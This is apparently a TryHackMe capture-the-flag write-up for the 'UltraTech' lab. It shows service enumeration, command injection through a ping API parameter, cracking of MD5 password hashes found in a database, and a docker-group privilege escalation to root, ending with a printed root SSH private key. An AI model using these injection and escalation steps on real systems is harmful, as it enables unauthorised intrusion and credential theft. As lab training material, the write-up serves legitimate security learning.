## UltraTech

#### The basics of Penetration Testing, Enumeration, Privilege Escalation and WebApp testing

### Task 1: Deploy the machine

**_Answer the questions below_**

1. **Deploy the machine**

- **_No Answer Needed._**

---

### Task 2: It's enumeration time!

After enumerating the services and resources available on this machine, what did you discover?

#### NMAP SCAN

```
# Nmap 7.91 scan initiated Sat Oct 02 14:51:50 2021 as: "C:\\Program Files\\Nmap\\nmap.exe" -sC -sV -p- -oN C:/Users/something/Desktop/nmap.txt 10.10.57.132
Nmap scan report for 10.10.57.132
Host is up (0.21s latency).
Not shown: 65531 closed ports
PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.3
22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc:66:89:85:e7:05:c2:a5:da:7f:01:20:3a:13:fc:27 (RSA)
|   256 c3:67:dd:26:fa:0c:56:92:f3:5b:a0:b3:8d:6d:20:ab (ECDSA)
|_  256 11:9b:5a:d6:ff:2f:e4:49:d2:b5:17:36:0e:2f:1d:2f (ED25519)
8081/tcp  open  http    Node.js Express framework
|_http-cors: HEAD GET POST PUT DELETE
|_http-title: Site doesn't have a title (text/html; charset=utf-8).
31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: UltraTech - The best of technology (AI, FinTech, Big Data)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Oct 02 15:05:18 2021 -- 1 IP address (1 host up) scanned in 809.07 seconds

```

**_Answer the questions below_**

1. **Which software is using the port 8081?**

- **_Node.js_**

2. **Which other non-standard port is used?**

- **_31331_**

3. **Which software using this port?**

- **_Apache_**

4. **Which GNU/Linux distribution seems to be used?**

- **_Ubuntu_**

5. **The software using the port 8080 is a REST api, how many of its routes are used by the web application?**

- **_2_**

---

### Task 3: Let the fun begin

Now that you know which services are available, it's time to exploit them!

Did you find somewhere you could try to login? Great!

Quick and dirty login implementations usually goes with poor data management.

There must be something you can do to explore this machine more thoroughly..

Lets Scan Website with Nikto

#### NIKTO

```

- Nikto v2.1.5/2.1.5

* Target Host: ip-10-10-158-186.eu-west-1.compute.internal
* Target Port: 31331
* GET /: Server leaks inodes via ETags, header found with file /, fields: 0x17cc 0x584b2b811ebb3
* GET /: The anti-clickjacking X-Frame-Options header is not present.
* GET /robots.txt: "robots.txt" contains 1 entry which should be manually viewed.
* OPTIONS /: Allowed HTTP Methods: HEAD, GET, POST, OPTIONS
* -3268: GET /images/: /images/: Directory indexing found.
* -3268: GET /images/?pattern=/etc/_&sort=name: /images/?pattern=/etc/_&sort=name: Directory indexing found.
* -3233: GET /icons/README: /icons/README: Apache default file found.

```

Fuzz Directory With Gobuster.

#### GOBUSTER

```
/css (Status: 301)
/favicon.ico (Status: 200)
/images (Status: 301)
/index.html (Status: 200)
/index.html (Status: 200)
/javascript (Status: 301)
/js (Status: 301)
/partners.html (Status: 200)
/robots.txt (Status: 200)
/robots.txt (Status: 200)
/server-status (Status: 403)
/what.html (Status: 200)

```

#### Robots.txt

http://10.10.158.186:31331/robots.txt

```
Allow: _
User-Agent: _
Sitemap: /utech_sitemap.txt
```

#### utech_sitemap.txt

http://10.10.158.186:31331/utech_sitemap.txt

```
/
/index.html
/what.html
/partners.html

```

Lets Visit Partners.html

!["Partners.html"](https://github.com/vrbait1107/CTF_WRITEUPS/blob/main/TryHackMe/images/UltraTech/Picture-1.png "Partners.html")

By Checking View Page Source, We find api.js

`http://10.10.158.186:31331/js/api.js`

```js
(function () {
  console.warn("Debugging ::");

  function getAPIURL() {
    return `${window.location.hostname}:8081`;
  }

  function checkAPIStatus() {
    const req = new XMLHttpRequest();
    try {
      const url = `http://${getAPIURL()}/ping?ip=${window.location.hostname}`;
      req.open("GET", url, true);
      req.onload = function (e) {
        if (req.readyState === 4) {
          if (req.status === 200) {
            console.log("The api seems to be running");
          } else {
            console.error(req.statusText);
          }
        }
      };
      req.onerror = function (e) {
        console.error(xhr.statusText);
      };
      req.send(null);
    } catch (e) {
      console.error(e);
      console.log("API Error");
    }
  }
  checkAPIStatus();
  const interval = setInterval(checkAPIStatus, 10000);
  const form = document.querySelector("form");
  form.action = `http://${getAPIURL()}/auth`;
})();
```

By Analysing We have Remote Code Execution.

1. **There is a database lying around, what is its filename?**

- **_Ans: utech.db.sqlite_**

By Using this URL http://10.10.158.186:8081/ping?ip=`ls`

We have got

`ping: utech.db.sqlite: Name or service not known`

2. **What is the first user's password hash?**

- **_Ans: f357a0c52799563c7c7b76c1e7543a32_**

Lets Cat this. We have found below Hash

```
ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded

```

3. **What is the password associated with this hash?**

- **_Ans: n100906_**

Lets Crack Above Hash with Hashcat

Cracking `f357a0c52799563c7c7b76c1e7543a32`

```

root@ip-10-10-191-82:~/Desktop# hashcat hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache built:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344391
* Bytes.....: 139921497
* Keyspace..: 14344384
* Runtime...: 2 secs

f357a0c52799563c7c7b76c1e7543a32:n100906

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: f357a0c52799563c7c7b76c1e7543a32
Time.Started.....: Sun Oct  3 15:36:33 2021 (1 sec)
Time.Estimated...: Sun Oct  3 15:36:34 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3401.2 kH/s (0.31ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5244928/14344384 (36.56%)
Rejected.........: 0/5244928 (0.00%)
Restore.Point....: 5242880/14344384 (36.55%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: n1ckoo -> n0i2c2k5

Started: Sun Oct  3 15:36:05 2021
Stopped: Sun Oct  3 15:36:36 2021
root@ip-10-10-191-82:~/Desktop#

```

Cracking `0d0ea5111e3c1def594c1684e3b9be84`

```
root@ip-10-10-191-82:~# hashcat hash.txt /usr/share/wordlists/rockyou.txt
hashcat (v6.1.1-66-g6a419d06) starting...

* Device #2: Outdated POCL OpenCL driver detected!

This OpenCL driver has been marked as likely to fail kernel compilation or to produce false negatives.
You can use --force to override this, but do not report related errors.

OpenCL API (OpenCL 1.2 LINUX) - Platform #1 [Intel(R) Corporation]
==================================================================
* Device #1: Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, 3878/3942 MB (985 MB allocatable), 2MCU

OpenCL API (OpenCL 1.2 pocl 1.1 None+Asserts, LLVM 6.0.0, SPIR, SLEEF, DISTRO, POCL_DEBUG) - Platform #2 [The pocl project]
===========================================================================================================================
* Device #2: pthread-Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz, skipped

Minimum password length supported by kernel: 0
Maximum password length supported by kernel: 256

Hashes: 1 digests; 1 unique digests, 1 unique salts
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates
Rules: 1

Applicable optimizers applied:
* Zero-Byte
* Early-Skip
* Not-Salted
* Not-Iterated
* Single-Hash
* Single-Salt
* Raw-Hash

ATTENTION! Pure (unoptimized) backend kernels selected.
Using pure kernels enables cracking longer passwords but for the price of drastically reduced performance.
If you want to switch to optimized backend kernels, append -O to your commandline.
See the above message to find out about the exact limits.

Watchdog: Hardware monitoring interface not found on your system.
Watchdog: Temperature abort trigger disabled.

Host memory required for this attack: 0 MB

Dictionary cache hit:
* Filename..: /usr/share/wordlists/rockyou.txt
* Passwords.: 14344384
* Bytes.....: 139921497
* Keyspace..: 14344384

0d0ea5111e3c1def594c1684e3b9be84:mrsheafy

Session..........: hashcat
Status...........: Cracked
Hash.Name........: MD5
Hash.Target......: 0d0ea5111e3c1def594c1684e3b9be84
Time.Started.....: Sun Oct  3 15:53:18 2021 (2 secs)
Time.Estimated...: Sun Oct  3 15:53:20 2021 (0 secs)
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:  3440.5 kH/s (0.29ms) @ Accel:1024 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests
Progress.........: 5345280/14344384 (37.26%)
Rejected.........: 0/5345280 (0.00%)
Restore.Point....: 5343232/14344384 (37.25%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidates.#1....: mrsoutlaw1 -> mrsburger

Started: Sun Oct  3 15:53:18 2021
Stopped: Sun Oct  3 15:53:21 2021
root@ip-10-10-191-82:~#

```

---

### Task 4: The root of all evil

Congrats if you've made it this far, you should be able to comfortably run commands on the server by now!

Now's the time for the final step!

You'll be on your own for this one, there is only one question and there might be more than a single way to reach your goal.

Mistakes were made, take advantage of it.

**_Answer the questions below_**

1. **What are the first 9 characters of the root user's private SSH key?**

- **_Ans: MIIEogIBA_**

Lets SSH Using Crack Password r00t@IP

We have found that `r00t` is part of Docker Group. Lets Escalate Priviledges

```
r00t@ultratech-prod:~$ id
uid=1001(r00t) gid=1001(r00t) groups=1001(r00t),116(docker)
r00t@ultratech-prod:~$ docker run -v /:/mnt --rm -it bash chroot /mnt sh

id

id
# # uid=0(root) gid=0(root) groups=0(root),1(daemon),2(bin),3(sys),4(adm),6(disk),10(uucp),11,20(dialout),26(tape),27(sudo)
#
# which python
/usr/bin/python
# python -c 'import pty;pty.spawn("/bin/bash")'
groups: cannot find name for group ID 11
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@468bed3844fa:/#

```

```
root@468bed3844fa:~# ls -la
total 40
drwx------  6 root root 4096 Mar 22  2019 .
drwxr-xr-x 23 root root 4096 Mar 19  2019 ..
-rw-------  1 root root  844 Mar 22  2019 .bash_history
-rw-r--r--  1 root root 3106 Apr  9  2018 .bashrc
drwx------  2 root root 4096 Mar 22  2019 .cache
drwx------  3 root root 4096 Mar 22  2019 .emacs.d
drwx------  3 root root 4096 Mar 22  2019 .gnupg
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
-rw-------  1 root root    0 Mar 22  2019 .python_history
drwx------  2 root root 4096 Mar 22  2019 .ssh
-rw-rw-rw-  1 root root  193 Mar 22  2019 private.txt
root@468bed3844fa:~# cat private.txt
# Life and acomplishments of Alvaro Squalo - Tome I

Memoirs of the most successful digital nomdad finblocktech entrepreneur
in the world.

By himself.

## Chapter 1 - How I became successful

root@468bed3844fa:~# cd .ssh/
root@468bed3844fa:~/.ssh# ls -la
total 16
drwx------ 2 root root 4096 Mar 22  2019 .
drwx------ 6 root root 4096 Mar 22  2019 ..
-rw------- 1 root root    0 Mar 19  2019 authorized_keys
-rw------- 1 root root 1675 Mar 22  2019 id_rsa
-rw-r--r-- 1 root root  401 Mar 22  2019 id_rsa.pub
root@468bed3844fa:~/.ssh# cat id_rsa
-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAuDSna2F3pO8vMOPJ4l2PwpLFqMpy1SWYaaREhio64iM65HSm
sIOfoEC+vvs9SRxy8yNBQ2bx2kLYqoZpDJOuTC4Y7VIb+3xeLjhmvtNQGofffkQA
jSMMlh1MG14fOInXKTRQF8hPBWKB38BPdlNgm7dR5PUGFWni15ucYgCGq1Utc5PP
NZVxika+pr/U0Ux4620MzJW899lDG6orIoJo739fmMyrQUjKRnp8xXBv/YezoF8D
hQaP7omtbyo0dczKGkeAVCe6ARh8woiVd2zz5SHDoeZLe1ln4KSbIL3EiMQMzOpc
jNn7oD+rqmh/ygoXL3yFRAowi+LFdkkS0gqgmwIDAQABAoIBACbTwm5Z7xQu7m2J
tiYmvoSu10cK1UWkVQn/fAojoKHF90XsaK5QMDdhLlOnNXXRr1Ecn0cLzfLJoE3h
YwcpodWg6dQsOIW740Yu0Ulr1TiiZzOANfWJ679Akag7IK2UMGwZAMDikfV6nBGD
wbwZOwXXkEWIeC3PUedMf5wQrFI0mG+mRwWFd06xl6FioC9gIpV4RaZT92nbGfoM
BWr8KszHw0t7Cp3CT2OBzL2XoMg/NWFU0iBEBg8n8fk67Y59m49xED7VgupK5Ad1
5neOFdep8rydYbFpVLw8sv96GN5tb/i5KQPC1uO64YuC5ZOyKE30jX4gjAC8rafg
o1macDECgYEA4fTHFz1uRohrRkZiTGzEp9VUPNonMyKYHi2FaSTU1Vmp6A0vbBWW
tnuyiubefzK5DyDEf2YdhEE7PJbMBjnCWQJCtOaSCz/RZ7ET9pAMvo4MvTFs3I97
eDM3HWDdrmrK1hTaOTmvbV8DM9sNqgJVsH24ztLBWRRU4gOsP4a76s0CgYEA0LK/
/kh/lkReyAurcu7F00fIn1hdTvqa8/wUYq5efHoZg8pba2j7Z8g9GVqKtMnFA0w6
t1KmELIf55zwFh3i5MmneUJo6gYSXx2AqvWsFtddLljAVKpbLBl6szq4wVejoDye
lEdFfTHlYaN2ieZADsbgAKs27/q/ZgNqZVI+CQcCgYAO3sYPcHqGZ8nviQhFEU9r
4C04B/9WbStnqQVDoynilJEK9XsueMk/Xyqj24e/BT6KkVR9MeI1ZvmYBjCNJFX2
96AeOaJY3S1RzqSKsHY2QDD0boFEjqjIg05YP5y3Ms4AgsTNyU8TOpKCYiMnEhpD
kDKOYe5Zh24Cpc07LQnG7QKBgCZ1WjYUzBY34TOCGwUiBSiLKOhcU02TluxxPpx0
v4q2wW7s4m3nubSFTOUYL0ljiT+zU3qm611WRdTbsc6RkVdR5d/NoiHGHqqSeDyI
6z6GT3CUAFVZ01VMGLVgk91lNgz4PszaWW7ZvAiDI/wDhzhx46Ob6ZLNpWm6JWgo
gLAPAoGAdCXCHyTfKI/80YMmdp/k11Wj4TQuZ6zgFtUorstRddYAGt8peW3xFqLn
MrOulVZcSUXnezTs3f8TCsH1Yk/2ue8+GmtlZe/3pHRBW0YJIAaHWg5k2I3hsdAz
bPB7E9hlrI0AconivYDzfpxfX+vovlP/DdNVub/EO7JSO+RAmqo=
-----END RSA PRIVATE KEY-----
root@468bed3844fa:~/.ssh#

```

---
